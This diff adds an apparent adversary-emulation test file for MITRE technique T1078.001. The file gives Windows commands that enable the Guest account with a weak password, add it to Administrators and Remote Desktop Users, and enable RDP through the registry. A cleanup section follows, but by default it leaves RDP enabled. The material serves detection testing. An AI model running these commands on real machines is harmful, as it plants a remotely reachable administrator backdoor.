@@ -1,0 +1,21 @@
+################T1078.001.md################
+
+##Atomic Test #1 - Enable Guest account with RDP capability and admin privileges
+
+```net user guest /active:yes```
+```net user guest Password123!```
+```net localgroup Administrators guest /add```
+```net localgroup "Remote Desktop Users" guest /add```
+```reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
+```reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f```
+
+#Evidencia
+```net user guest```
+
+#Borrado
+```net user guest /active:no >nul 2>&1```
+```net localgroup Administrators guest /delete >nul 2>&1```
+```net localgroup "Remote Desktop Users" guest /delete >nul 2>&1```
+```if 0 NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)```
+```if 0 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)```
+```if 0 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)```
